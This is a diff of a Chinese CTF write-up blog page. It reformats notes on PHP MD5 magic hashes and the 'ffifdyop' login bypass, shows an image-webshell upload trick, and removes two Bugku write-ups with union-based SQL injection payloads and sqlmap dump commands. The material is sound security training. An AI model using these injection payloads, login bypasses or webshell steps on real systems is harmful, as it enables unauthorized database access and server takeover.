@@ -421,8 +421,12 @@
 <h2 id="相关漏洞"><a href="#相关漏洞" class="headerlink" title="相关漏洞"></a>相关漏洞</h2><h3 id="php弱比较"><a href="#php弱比较" class="headerlink" title="php弱比较"></a>php弱比较</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="variable">$b</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$a</span> != <span class="variable">$b</span> &amp;&amp; <span class="title function_ invoke__">md5</span>(<span class="variable">$a</span>) == <span class="title function_ invoke__">md5</span>(<span class="variable">$b</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Success!&quot;</span>);</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;Failed!&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>若两个字符经过MD5加密后的值为 0e 开头的字符串，在php弱比较中会被认为是科学计数法，表示为0*10的若干次方，结果为零，判定为相等。</p>
-<p>下列字符串在经过MD5加密后形成值为 0e 开头的字符串。<br>QNKCDZO<br>240610708<br>s878926199a<br>s155964671a<br>s214587387a<br>s1091221200a</p>
-<p>下列字符串在经过MD5和二次MD5加密后均形成值为 0e 开头的字符串。<br>CbDLytmyGm2xQyaLNhWn<br>770hQgrBOjrcqftrlaZk<br>7r4lGXCH2Ksu2JNT3BYM</p>
+<p>下列字符串在经过MD5加密后形成值为 0e 开头的字符串。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">QNKCDZO</span><br><span class="line">240610708</span><br><span class="line">s878926199a</span><br><span class="line">s155964671a</span><br><span class="line">s214587387a</span><br><span class="line">s1091221200a</span><br></pre></td></tr></table></figure>
+
+<p>下列字符串在经过MD5和二次MD5加密后均形成值为 0e 开头的字符串。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">CbDLytmyGm2xQyaLNhWn</span><br><span class="line">770hQgrBOjrcqftrlaZk</span><br><span class="line">7r4lGXCH2Ksu2JNT3BYM</span><br></pre></td></tr></table></figure>
+
 <p>检验代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&quot;CbDLytmyGm2xQyaLNhWn&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$str</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
@@ -439,8 +443,8 @@
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">readmyfile</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$fh</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$path</span>, <span class="string">&quot;rb&quot;</span>);</span><br><span class="line">    <span class="variable">$data</span> = <span class="title function_ invoke__">fread</span>(<span class="variable">$fh</span>, <span class="title function_ invoke__">filesize</span>(<span class="variable">$path</span>));</span><br><span class="line">    <span class="title function_ invoke__">fclose</span>(<span class="variable">$fh</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$data</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;二进制md5加密 &#x27;</span>. <span class="title function_ invoke__">md5</span>( (<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;1_msg1.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&#x27;url编码 &#x27;</span>. <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;1_msg1.txt&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;二进制md5加密 &#x27;</span>.<span class="title function_ invoke__">md5</span>( (<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;1_msg2.txt&quot;</span>)));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>  <span class="string">&#x27;url编码 &#x27;</span>.  <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">readmyfile</span>(<span class="string">&quot;1_msg2.txt&quot;</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
 
 <h3 id="构造sql注入攻击语句"><a href="#构造sql注入攻击语句" class="headerlink" title="构造sql注入攻击语句"></a>构造sql注入攻击语句</h3><p>当目标网站使用如下查询语句时，可以通过特殊字符串进行MD5加密后形成万能密码从而产生注入攻击。<br><code>select * from &#39;admin&#39; where password=md5($pass,true)</code></p>
-<p>这个特殊字符串就是 ffifdyop ，在进行MD5加密后的值为<code>276f722736c95d99e921722cf9ed621c</code>， 对应的ascii字符串为 <code>&#39;or&#39;6�]��!r,��b</code>，这个字符串前几位刚好是<code>&#39; or &#39;6</code>，<br>而 Mysql 会将 hex 转成 ascii 解释，因此拼接之后的形式是<code>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6&lt;乱码》</code>，相当于<code>select * from &#39;admin&#39; where password=&#39;&#39; or 1</code>，即sql万能密码，能够绕过md5()函数。</p>
-<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>对于题目的更多要求，可以自行编写php或者python脚本将特殊字符串的内容跑出来。</p>
+<p>这个特殊字符串就是 ffifdyop ，在进行MD5加密后的值为<code>276f722736c95d99e921722cf9ed621c</code>， 对应的ascii字符串为 <code>&#39;or&#39;6�]��!r,��b </code>，这个字符串前几位刚好是<code>&#39; or &#39;6</code>，<br>而 Mysql 会将 hex 转成 ascii 解释，因此拼接之后的形式是<code>select * from &#39;admin&#39; where password=&#39;&#39; or &#39;6&lt;乱码&gt;</code>，相当于<code>select * from &#39;admin&#39; where password=&#39;&#39; or 1</code>，即sql万能密码，能够绕过 md5() 函数。</p>
+<h3 id="其它"><a href="#其它" class="headerlink" title="其它"></a>其它</h3><p>对于题目的更多要求，可以自行编写 php 或者 python 脚本将特殊字符串的内容跑出来。</p>
 
       
     </div>
@@ -1773,164 +1777,6 @@
 <h3 id="burp抓包添加数据"><a href="#burp抓包添加数据" class="headerlink" title="burp抓包添加数据"></a>burp抓包添加数据</h3><p>在上传图片文件时，用bp抓取请求包，修改图片文件名后缀为 .php ，在图片文件内容后面增加一句话木马后放开请求即可。</p>
 <h3 id="Windows命令制作"><a href="#Windows命令制作" class="headerlink" title="Windows命令制作"></a>Windows命令制作</h3><p><code>copy x.png /b + 1.php /a shell.png</code><br>其中 x. png 是一个普通的 png 图片文件，1.php 是 webshell 文件。<br>该命令就是将以二进制方式读取的 x.png 文件内容和以 ASCII 编码方式读取的 1.php 文件内容合并，生成新的文件 shell. png 就是图片马了，最后修改图片文件名的后缀为php上传即可。</p>
 <p>一句话木马文件上传后使用中国蚁剑连接目标服务器在根目录可以找到 flag 文件。</p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/WriteUP-sqlmap_boy/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-      <meta itemprop="name" content="Garmin">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="94RM1n">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 94RM1n">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/WriteUP-sqlmap_boy/" class="post-title-link" itemprop="url">sqlmap_boy</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/WriteUP/" itemprop="url" rel="index"><span itemprop="name">WriteUP</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p><a target="_blank" rel="noopener" href="https://ctf.bugku.com/challenges/detail/id/1270.html">sqlmap_boy - Bugku CTF</a><br>本题是一个典型的sql注入题目。</p>
-<p>查看页面源代码得到查表语句的构成提示。<br><code>&lt;!-- $sql = &#39;select username,password from users where username=&quot;&#39;.$username.&#39;&quot; &amp;&amp; password=&quot;&#39;.$password.&#39;&quot;;&#39;; --&gt;</code></p>
-<p>根据查表语句构建万能密码就可以登录了。<br><code>admin&#39;&quot; or 1=1;#</code></p>
-<p>登录进去后发现有数据回显，观察此时的url，发现访问的是&#x2F;secrets.php，且id值为1.<br><code>http://82.157.146.43:16002/secrets.php?id=1</code></p>
-<h2 id="手工注入"><a href="#手工注入" class="headerlink" title="手工注入"></a>手工注入</h2><p>改变id观察回显状态，多次尝试发现get参数存在sql字符型注入漏洞。</p>
-<h3 id="观察回显的字段"><a href="#观察回显的字段" class="headerlink" title="观察回显的字段"></a>观察回显的字段</h3><p><code>id=-1&#39; union select 1,2,3--+</code><br>发现回显数据为第二、三字段。</p>
-<h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><p><code>id=-1&#39; union select 1,2,database()--+</code></p>
-<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><p><code>id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()--+</code></p>
-<h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><p><code>id=-1&#39; union select 1,2,group_concat(column_name) from information_schema.columns where table_name=&#39;flag&#39;--+</code></p>
-<h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><p><code>id=-1&#39; union select 1,2,group_concat(flAg) from moectf.flag--+</code></p>
-
-      
-    </div>
-
-    
-    
-    
-
-    <footer class="post-footer">
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-</div>
-
-
-
-
-    
-
-
-<div class="post-block">
-  
-  
-
-  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
-    <link itemprop="mainEntityOfPage" href="http://example.com/WriteUP-NotAnotherSQLi/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-      <meta itemprop="name" content="Garmin">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="94RM1n">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
-      <meta itemprop="name" content="undefined | 94RM1n">
-      <meta itemprop="description" content="">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          <a href="/WriteUP-NotAnotherSQLi/" class="post-title-link" itemprop="url">NotAnotherSQLi</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-folder"></i>
-      </span>
-      <span class="post-meta-item-text">分类于</span>
-        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-          <a href="/categories/WriteUP/" itemprop="url" rel="index"><span itemprop="name">WriteUP</span></a>
-        </span>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <p><a target="_blank" rel="noopener" href="https://ctf.bugku.com/challenges/detail/id/703.html">NotAnotherSQLi - Bugku CTF</a><br>本题是一个典型的sql注入题目。</p>
-<p>在username处使用sql万能密码就可以得到flag了。<br><code>admin&#39; or 1=1;#</code></p>
-<h2 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h2><p><a target="_blank" rel="noopener" href="https://sqlmap.org/">sqlmap: automatic SQL injection and database takeover tool</a><br>也可以使用sqlmap进行post注入攻击一把梭。</p>
-<p>sqlmap的具体使用操作可以参考<a target="_blank" rel="noopener" href="https://sqlmap.highlight.ink/">sqlmap 用户手册 (highlight.ink)</a>。</p>
-<p>在本题中sqlmap使用过程如下：</p>
-<h3 id="爆库名"><a href="#爆库名" class="headerlink" title="爆库名"></a>爆库名</h3><p><code>python sqlmap.py -u &quot;http://82.157.146.43:11297/&quot; --form --batch --dbs</code></p>
-<h3 id="爆表名"><a href="#爆表名" class="headerlink" title="爆表名"></a>爆表名</h3><p><code>python sqlmap.py -u &quot;http://82.157.146.43:11297/&quot; --form --batch -D SqliDB --tables</code></p>
-<h3 id="爆列名"><a href="#爆列名" class="headerlink" title="爆列名"></a>爆列名</h3><p><code>python sqlmap.py -u &quot;http://82.157.146.43:11297/&quot; --form --batch -D SqliDB -T login --columns</code></p>
-<h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><p><code>python sqlmap.py -u &quot;http://82.157.146.43:11297/&quot; --form --batch -D SqliDB -T login -C User --dump</code></p>
-<p><code>python sqlmap.py -u &quot;http://82.157.146.43:11297/&quot; --form --batch -D SqliDB -T login -C Password --dump</code></p>
 
       
     </div>
